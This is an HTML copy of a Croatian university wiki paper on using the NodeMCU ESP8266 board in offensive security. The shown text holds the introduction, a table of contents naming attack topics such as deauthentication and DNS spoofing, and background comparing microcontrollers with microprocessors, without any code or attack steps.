@@ -1,0 +1,1517 @@
+<!DOCTYPE html>
+<html lang="hr" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>Internet of Wrongs: NodeMCU ESP8266 SoC u ofenzivnoj sigurnosti - SIS Wiki</title>
+<meta name="generator" content="MediaWiki 1.17.0" />
+<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="../opensearch_desc.php" title="SIS Wiki (hr)" />
+<link rel="EditURI" type="application/rsd+xml" href="../api.php%3Faction=rsd" />
+<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti&amp;action=creativecommons" rel="meta" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
+<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
+<link rel="stylesheet" href="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
+<body class="mediawiki ltr ns-0 ns-subject page-Internet_of_Wrongs_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti skin-vector">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<!-- content -->
+		<div id="content">
+			<a id="top"></a>
+			<div id="mw-js-message" style="display:none;"></div>
+						<!-- firstHeading -->
+			<h1 id="firstHeading" class="firstHeading">Internet of Wrongs: NodeMCU ESP8266 SoC u ofenzivnoj sigurnosti</h1>
+			<!-- /firstHeading -->
+			<!-- bodyContent -->
+			<div id="bodyContent">
+				<!-- tagline -->
+				<div id="siteSub">Izvor: SIS Wiki</div>
+				<!-- /tagline -->
+				<!-- subtitle -->
+				<div id="contentSub"></div>
+				<!-- /subtitle -->
+																<!-- jumpto -->
+				<div id="jump-to-nav">
+					Skoči na: <a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#mw-head">orijentacija</a>,
+					<a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#p-search">traži</a>
+				</div>
+				<!-- /jumpto -->
+								<!-- bodytext -->
+				<p><b>Autor: Karlo Grlić</b>
+</p><p><br />
+</p>
+<table style="border: 1px solid #a2a9b1;border-spacing: 3px;background-color: #cce6ff;color: black;margin: 0.5em 0 0.5em 1em;padding: 0.2em;float: right;clear: right;font-size: 88%;line-height: 1.5em; max-width: 300px">
+<tr>
+<td><div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:272px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Esp8266chip.JPG" class="image"><img alt="Esp8266chip.JPG" src="../images/thumb/2/2e/Esp8266chip.JPG/270px-Esp8266chip.JPG" width="270" height="194" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Esp8266chip.JPG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div></div></div></div></div>
+</td></tr>
+<tr>
+<td> <b>NodeMCU ESP8266 DEVKIT v2</b>
+</td></tr>
+<tr>
+<td> <a href="https://github.com/nodemcu/nodemcu-devkit-v1.0" class="external text" rel="nofollow">Više informacija o hardveru</a>
+</td></tr>
+<tr>
+<td><b>Opis</b>: NodeMCU ESP8266 DEVKIT v2 je razvojna elektronička pločica sa ugrađenim Wi-fi funkcionalnostima.
+</td></tr>
+<tr>
+<td><b>Operacijski sustav</b>: XTOS<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[1]</a></sup>
+</td></tr>
+<tr>
+<td><b>CPU</b>: ESP8266(LX106)<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[1]</a></sup>
+</td></tr>
+<tr>
+<td><b>Memorija</b>: 128kBytes<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[1]</a></sup>
+</td></tr>
+<tr>
+<td><b>Pohrana</b>: 4MBytes<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[1]</a></sup>
+</td></tr></table>
+<p><br />
+Nedavnom <a href="https://www.youtube.com/watch?v=UoBUXOOdLXY" class="external text" rel="nofollow">popularizacijom</a> prijenosnih single-board računala poput Raspberry PI-a, mikrokontrolerskih pločica poput Arduina i nadasve globalnog umrežavanja fizičkih uređaja nastala je popularna kovanica <i>Internet of Things</i> (IOT), koja upravo obuhvaća navedene tehnologije i ideju o dostupnosti pristupa internetu fizičkim uređajima, tj. dostupnost pristupa tim uređajima putem interneta.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:702px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:IoT-Comic.png" class="image"><img alt="" src="../images/thumb/f/f4/IoT-Comic.png/700px-IoT-Comic.png" width="700" height="285" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:IoT-Comic.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 1.</b> IOT karikatura (Izvor: <a href="https://www.cbinsights.com/blog/internet-things-iot-startups/" class="external free" rel="nofollow">https://www.cbinsights.com/blog/internet-things-iot-startups/</a>)</div></div></div></div>
+<p>Iako je namjena IOT uređaja u glavnini legitimna i korisna, nedvojbeno je da se isti u krivim rukama mogu biti (is)korišteni u cyber napadima te tako predstavljaju veliku, i pomalo neočekivanu, sigurnosnu prijetnju. Primjer vrlo velikog napada putem IOT uređaja bio je 2016. godine, a sproveden je putem IOT uređaja zaraženih Mirai botnetom<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[2]</a></sup>. Više o tome može se pročitati na sljedećim linkovima:
+</p>
+<ul><li><a href="https://www.theguardian.com/technology/2016/oct/26/ddos-attack-dyn-mirai-botnet" class="external free" rel="nofollow">https://www.theguardian.com/technology/2016/oct/26/ddos-attack-dyn-mirai-botnet</a>
+</li><li><a href="https://www.incapsula.com/blog/malware-analysis-mirai-ddos-botnet.html" class="external free" rel="nofollow">https://www.incapsula.com/blog/malware-analysis-mirai-ddos-botnet.html</a>
+</li><li><a href="https://krebsonsecurity.com/2016/12/researchers-find-fresh-fodder-for-iot-attack-cannons/" class="external free" rel="nofollow">https://krebsonsecurity.com/2016/12/researchers-find-fresh-fodder-for-iot-attack-cannons/</a>
+</li></ul>
+<p><br />
+<b>Cilj ovog rada je istražiti mogućnosti korištenja jedne IOT platforme u tzv. ofenzivnoj sigurnosti te također napraviti <i>proof of concept</i> implementacije, čime zapravo Internet of Things hardver postaje Internet of Wrongs (kovanica preuzeta iz članka Steva Lorda <a href="https://www.rawhex.com/2016/06/building-internet-wrongs/" class="external free" rel="nofollow">https://www.rawhex.com/2016/06/building-internet-wrongs/</a>).</b>
+</p><p><br />
+Korištena IOT platforma jest popularni NodeMCU v2 ESP8266 DEVKIT 1.0 (ESP12E v2 DEVKIT) mikrokontroler čija je posebnost mogućnost umrežavanja putem bežićnih WiFi mreža. Više o samoj platformi slijedi u nastavku rada.
+</p><p><br />
+</p>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#O_NodeMCU_ESP8266_WiFi_plo.C4.8Dici"><span class="tocnumber">1</span> <span class="toctext">O NodeMCU ESP8266 WiFi pločici</span></a>
+<ul>
+<li class="toclevel-2 tocsection-2"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Mikrokontroleri_vs._single-board_mikroprocesorska_ra.C4.8Dunala"><span class="tocnumber">1.1</span> <span class="toctext">Mikrokontroleri vs. single-board mikroprocesorska računala</span></a></li>
+<li class="toclevel-2 tocsection-3"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#ESP8266.2C_MCU_ili_MPU.3F"><span class="tocnumber">1.2</span> <span class="toctext">ESP8266, MCU ili MPU?</span></a></li>
+<li class="toclevel-2 tocsection-4"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#NodeMCU.3F_ESP12E.3F_ESP8266.3F_SoC.3F_DEVKIT_v2.3F"><span class="tocnumber">1.3</span> <span class="toctext">NodeMCU? ESP12E? ESP8266? SoC? DEVKIT v2?</span></a>
+<ul>
+<li class="toclevel-3 tocsection-5"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#ESP8266_.28ESP8266EX.29_SoC"><span class="tocnumber">1.3.1</span> <span class="toctext">ESP8266 (ESP8266EX) SoC</span></a></li>
+<li class="toclevel-3 tocsection-6"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#ESP8266_moduli_.28ESP-12F.29"><span class="tocnumber">1.3.2</span> <span class="toctext">ESP8266 moduli (ESP-12F)</span></a>
+<ul>
+<li class="toclevel-4 tocsection-7"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#ESP-12F"><span class="tocnumber">1.3.2.1</span> <span class="toctext">ESP-12F</span></a></li>
+</ul>
+</li>
+<li class="toclevel-3 tocsection-8"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Razvojna_plo.C4.8Dica_.28NodeMCU_DEVKIT_v2.29"><span class="tocnumber">1.3.3</span> <span class="toctext">Razvojna pločica (NodeMCU DEVKIT v2)</span></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-9"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#ESP8266_SDKs.2C_frameworks_i_IDEs"><span class="tocnumber">2</span> <span class="toctext">ESP8266 SDKs, frameworks i IDEs</span></a>
+<ul>
+<li class="toclevel-2 tocsection-10"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Slu.C5.BEbeni_Espriff_SDK"><span class="tocnumber">2.1</span> <span class="toctext">Službeni Espriff SDK</span></a>
+<ul>
+<li class="toclevel-3 tocsection-11"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Dostupni_API"><span class="tocnumber">2.1.1</span> <span class="toctext">Dostupni API</span></a></li>
+<li class="toclevel-3 tocsection-12"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Tijek_razvoja_u_SDK"><span class="tocnumber">2.1.2</span> <span class="toctext">Tijek razvoja u SDK</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-13"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#ESP_Open_SDK"><span class="tocnumber">2.2</span> <span class="toctext">ESP Open SDK</span></a></li>
+<li class="toclevel-2 tocsection-14"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#NodeLua.2FNodeMCU_eLua_Firmwares"><span class="tocnumber">2.3</span> <span class="toctext">NodeLua/NodeMCU eLua Firmwares</span></a></li>
+<li class="toclevel-2 tocsection-15"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#MicroPython"><span class="tocnumber">2.4</span> <span class="toctext">MicroPython</span></a></li>
+<li class="toclevel-2 tocsection-16"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Arduino_Core_ESP8266"><span class="tocnumber">2.5</span> <span class="toctext">Arduino Core ESP8266</span></a></li>
+<li class="toclevel-2 tocsection-17"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Javascript.2C_Basic.2C_Lisp.2C_itd."><span class="tocnumber">2.6</span> <span class="toctext">Javascript, Basic, Lisp, itd.</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-18"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Postavljanje_Arduino_Corea_i_Eclipse_IDE-a"><span class="tocnumber">3</span> <span class="toctext">Postavljanje Arduino Corea i Eclipse IDE-a</span></a>
+<ul>
+<li class="toclevel-2 tocsection-19"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Arduino_IDE"><span class="tocnumber">3.1</span> <span class="toctext">Arduino IDE</span></a></li>
+<li class="toclevel-2 tocsection-20"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Arduino_Core"><span class="tocnumber">3.2</span> <span class="toctext">Arduino Core</span></a></li>
+<li class="toclevel-2 tocsection-21"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Eclipse_.28Sloeber.29_IDE"><span class="tocnumber">3.3</span> <span class="toctext">Eclipse (Sloeber) IDE</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-22"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Kori.C5.A1tenje_u_ofenzivnoj_sigurnosti"><span class="tocnumber">4</span> <span class="toctext">Korištenje u ofenzivnoj sigurnosti</span></a>
+<ul>
+<li class="toclevel-2 tocsection-23"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Real_World_primjeri_kori.C5.A1tenja_u_ofenzivnoj_sigurnosti"><span class="tocnumber">4.1</span> <span class="toctext">Real World primjeri korištenja u ofenzivnoj sigurnosti</span></a>
+<ul>
+<li class="toclevel-3 tocsection-24"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#ESP8266_War_Walker"><span class="tocnumber">4.1.1</span> <span class="toctext">ESP8266 War Walker</span></a></li>
+<li class="toclevel-3 tocsection-25"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Baby_monitor"><span class="tocnumber">4.1.2</span> <span class="toctext">Baby monitor</span></a></li>
+<li class="toclevel-3 tocsection-26"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Building_a_low_cost_wifi_camera"><span class="tocnumber">4.1.3</span> <span class="toctext">Building a low cost wifi camera</span></a></li>
+<li class="toclevel-3 tocsection-27"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Color_TV_Broadcasting"><span class="tocnumber">4.1.4</span> <span class="toctext">Color TV Broadcasting</span></a></li>
+<li class="toclevel-3 tocsection-28"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Ethernet_controller"><span class="tocnumber">4.1.5</span> <span class="toctext">Ethernet controller</span></a></li>
+<li class="toclevel-3 tocsection-29"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Captive_portal_.2F_DNS_redirection"><span class="tocnumber">4.1.6</span> <span class="toctext">Captive portal / DNS redirection</span></a></li>
+<li class="toclevel-3 tocsection-30"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Multi_target_De-Auth_attack"><span class="tocnumber">4.1.7</span> <span class="toctext">Multi target De-Auth attack</span></a></li>
+<li class="toclevel-3 tocsection-31"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#WiFi_AP_flooding"><span class="tocnumber">4.1.8</span> <span class="toctext">WiFi AP flooding</span></a></li>
+<li class="toclevel-3 tocsection-32"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Universal_Serial_aBUSe"><span class="tocnumber">4.1.9</span> <span class="toctext">Universal Serial aBUSe</span></a></li>
+<li class="toclevel-3 tocsection-33"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Mini_Wifi_Sniffer"><span class="tocnumber">4.1.10</span> <span class="toctext">Mini Wifi Sniffer</span></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-34"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Implementacija"><span class="tocnumber">5</span> <span class="toctext">Implementacija</span></a>
+<ul>
+<li class="toclevel-2 tocsection-35"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Arhitektura"><span class="tocnumber">5.1</span> <span class="toctext">Arhitektura</span></a></li>
+<li class="toclevel-2 tocsection-36"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Hardverska_implementacija"><span class="tocnumber">5.2</span> <span class="toctext">Hardverska implementacija</span></a>
+<ul>
+<li class="toclevel-3 tocsection-37"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Spajanje_hardvera"><span class="tocnumber">5.2.1</span> <span class="toctext">Spajanje hardvera</span></a></li>
+<li class="toclevel-3 tocsection-38"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Baterija"><span class="tocnumber">5.2.2</span> <span class="toctext">Baterija</span></a></li>
+<li class="toclevel-3 tocsection-39"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#3D_printano_ku.C4.87i.C5.A1te"><span class="tocnumber">5.2.3</span> <span class="toctext">3D printano kućište</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-40"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Implementacija_funkcionalnosti"><span class="tocnumber">5.3</span> <span class="toctext">Implementacija funkcionalnosti</span></a>
+<ul>
+<li class="toclevel-3 tocsection-41"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Serijska_komunikacija_izme.C4.91u_Node-ova_.28C.26C_vs._Execute.29"><span class="tocnumber">5.3.1</span> <span class="toctext">Serijska komunikacija između Node-ova (C&amp;C vs. Execute)</span></a></li>
+<li class="toclevel-3 tocsection-42"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Komunikacija_s_napada.C4.8Dem"><span class="tocnumber">5.3.2</span> <span class="toctext">Komunikacija s napadačem</span></a></li>
+<li class="toclevel-3 tocsection-43"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#SSID_beacon_flooding"><span class="tocnumber">5.3.3</span> <span class="toctext">SSID beacon flooding</span></a></li>
+<li class="toclevel-3 tocsection-44"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#DNS_spoofing"><span class="tocnumber">5.3.4</span> <span class="toctext">DNS spoofing</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-45"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Budu.C4.87i_rad"><span class="tocnumber">5.4</span> <span class="toctext">Budući rad</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-46"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Izvorni_kod"><span class="tocnumber">6</span> <span class="toctext">Izvorni kod</span></a></li>
+<li class="toclevel-1 tocsection-47"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Zaklju.C4.8Dak"><span class="tocnumber">7</span> <span class="toctext">Zaključak</span></a></li>
+<li class="toclevel-1 tocsection-48"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura"><span class="tocnumber">8</span> <span class="toctext">Literatura</span></a></li>
+<li class="toclevel-1 tocsection-49"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Vanjske_poveznice"><span class="tocnumber">9</span> <span class="toctext">Vanjske poveznice</span></a></li>
+<li class="toclevel-1 tocsection-50"><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Tako.C4.91er_pogledajte"><span class="tocnumber">10</span> <span class="toctext">Također pogledajte</span></a></li>
+</ul>
+</td></tr></table>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="O_NodeMCU_ESP8266_WiFi_plo.C4.8Dici"> O NodeMCU ESP8266 WiFi pločici </span></h2>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Mcu.jpg" class="image"><img alt="" src="../images/thumb/7/71/Mcu.jpg/180px-Mcu.jpg" width="180" height="101" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Mcu.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 2.</b> Mikrokontroler (Izvor: <a href="https://www.elprocus.com/wp-content/uploads/2013/02/12.jpg" class="external free" rel="nofollow">https://www.elprocus.com/wp-content/uploads/2013/02/12.jpg</a>)</div></div></div>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:A4-ARM-processor.jpg" class="image"><img alt="" src="../images/thumb/c/c9/A4-ARM-processor.jpg/180px-A4-ARM-processor.jpg" width="180" height="84" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:A4-ARM-processor.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 3.</b> A4 ARM mikroprocesor (Izvor: <a href="http://cdn.osxdaily.com/wp-content/uploads/2011/05/A4-ARM-processor.jpg" class="external free" rel="nofollow">http://cdn.osxdaily.com/wp-content/uploads/2011/05/A4-ARM-processor.jpg</a>)</div></div></div>
+<p>Prije no što dublje uđemo u karakteristike i potankosti o spomenutom hardveru, zadržimo se malo na samim definicijama mikrokontrolera, pločica i single-board računala. To će nam uvelike pomoći u tome da razumijemo što ovaj uređaj jest i što može, a što ne. Također, kako se na samom fakultetu u sklopu redovite nastave ne obrađuju teme iz područja elektrotehnike i elektronike, neupućen čitatelj može imati krivu percepciju o tome što je zapravo mikrokontroler (<b>MCU</b>), koje su razlike između single-board računala i pločica s mikrokontrolerom, tj. mikrokontrolera i mikroprocesora (<b>MPU</b>) i kakve su im zapravo namijene.
+</p>
+<h3> <span class="mw-headline" id="Mikrokontroleri_vs._single-board_mikroprocesorska_ra.C4.8Dunala"> Mikrokontroleri vs. single-board mikroprocesorska računala </span></h3>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:ARDUINO_UNO_DIP_01.png" class="image"><img alt="" src="../images/thumb/7/78/ARDUINO_UNO_DIP_01.png/180px-ARDUINO_UNO_DIP_01.png" width="180" height="131" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:ARDUINO_UNO_DIP_01.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 4.</b> Arduino UNO pločica sa Atmel mikrokontrolerom (Izvor: <a href="https://cdn-reichelt.de/bilder/web/xxl_ws/A300/ARDUINO_UNO_DIP_01.png" class="external free" rel="nofollow">https://cdn-reichelt.de/bilder/web/xxl_ws/A300/ARDUINO_UNO_DIP_01.png</a>)</div></div></div>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Raspberry_Pi_3_4_of_4_326a088e-e2d1-4adc-bbbb-c1f78f66ab77_1024x1024.jpg" class="image"><img alt="" src="../images/thumb/6/64/Raspberry_Pi_3_4_of_4_326a088e-e2d1-4adc-bbbb-c1f78f66ab77_1024x1024.jpg/180px-Raspberry_Pi_3_4_of_4_326a088e-e2d1-4adc-bbbb-c1f78f66ab77_1024x1024.jpg" width="180" height="180" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Raspberry_Pi_3_4_of_4_326a088e-e2d1-4adc-bbbb-c1f78f66ab77_1024x1024.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 5.</b> Raspberry PI 3 pločica sa  ARM Cortex-A53 ARM mikroprocesorom (Izvor: <a href="https://cdn.shopify.com/s/files/1/0174/1800/products/Raspberry_Pi_3_4_of_4_326a088e-e2d1-4adc-bbbb-c1f78f66ab77_1024x1024.JPG?v=1456565788" class="external free" rel="nofollow">https://cdn.shopify.com/s/files/1/0174/1800/products/Raspberry_Pi_3_4_of_4_326a088e-e2d1-4adc-bbbb-c1f78f66ab77_1024x1024.JPG?v=1456565788</a>)</div></div></div>
+<p>Neki od široko korištenih mikrokontrolera jesu mikrokontroleri na pločicama iz serije <a href="https://www.arduino.cc/en/Main/Products" class="external text" rel="nofollow">Arduino</a>, <a href="https://www.pjrc.com/teensy/" class="external text" rel="nofollow">Teensy</a> i <a href="https://espressif.com/en" class="external text" rel="nofollow">Espressif</a> ali i mnogi drugi. S druge strane, tu su i poznate serije single-board računala poput <a href="https://www.raspberrypi.org/" class="external text" rel="nofollow">Raspberry Pi-a</a>, <a href="http://www.orangepi.org/" class="external text" rel="nofollow">Orange Pi-a</a>, <a href="https://software.intel.com/en-us/iot/home" class="external text" rel="nofollow">Intela</a>, itd. No, postavlja se pitanje, u čemu leži razlika i kakva je namjena navedenih uređaja.
+</p><p>Naime, glavnina razlike između single-board mikroprocesorskih računala i mikrokontrolera leži u arhitekturi procesorske jedinice. Pogledajmo sljedeću tablicu usporedbe<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[3]</a></sup><sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[4]</a></sup>:
+</p>
+<table class="wikitable">
+
+<tr>
+<th>
+</th>
+<th> Mikrokontroler (MCU)
+</th>
+<th> Mikroprocesor (MPU)
+</th></tr>
+<tr>
+<td> <b>Memorija</b>
+</td>
+<td> <i>On-chip</i> flash memorija na kojoj je spremljen pogonski program (engl. <i>firmware</i>), što u prijevodu znači da će se uređaj uključiti gotovo trenutačno te će program izvoditi vrlo brzo. Nepovoljna činjenica je to što je takva flash memorija vrlo limitirana, najčešće ne više od 2 megabajta.
+</td>
+<td> Memorija je eksterna te se koristi kao spremište podataka (uglavnom NAND flash memorija - memorija na kojoj su podaci perzistentni i unatoč prestanku napajanja). Programi se iz memorije učitavaju u radnu memoriju (uglavnom DRAM) te se nakon toga izvršavaju.
+</td></tr>
+<tr>
+<td> <b>Performanse</b>
+</td>
+<td> Dok je sama procesorska moć puno slabija od mikroprocesora, povoljna činjenica za mikrokontroler je ta da on izvodi samo jedan pogonski program, uglavnom jednodretveno. Ovo osigurava i to da se s velikom determinističkom točnošću može odrediti kada će se što izvesti - što je i razlog zašto su mikrokontroleri dobri za upravljanje ostalim hardverom, npr. senzorima itd. Takt MCU-a je najčešće reda nekoliko desetaka do nekoliko stotina MHz.
+</td>
+<td> Iako je MPU znatno brži, često se na samoj pločici nalazi puni operacijski sustav te korisnički programi. Za ostvarivanje navedenog potrebno je da MPU ima mogućnost paralelnog rada i prioritetnih poslova, pa se zbog toga ne može deterministički točno odrediti kada će se nešto izvršiti, što je i razlog zašto MPU nije dobar za upravljanje ostalim hardverom.
+</td></tr>
+<tr>
+<td> <b>Potrošnja</b>
+</td>
+<td> Ima vrlo nisku potršnju energije što osigurava da ga se može pogoniti i putem baterijskih članaka.
+</td>
+<td> Veća potrošnja električne energije, uglavnom potreban vanjski izvor napajanja.
+</td></tr></table>
+<p>Gledajuću holistički, pločice sa mikrokontrolerom najčešće, zbog svoje namjene, imaju i naprednija sučelja za komunikaciju sa drugim uređajima, pa tako mikrokontroleri imaju:
+</p>
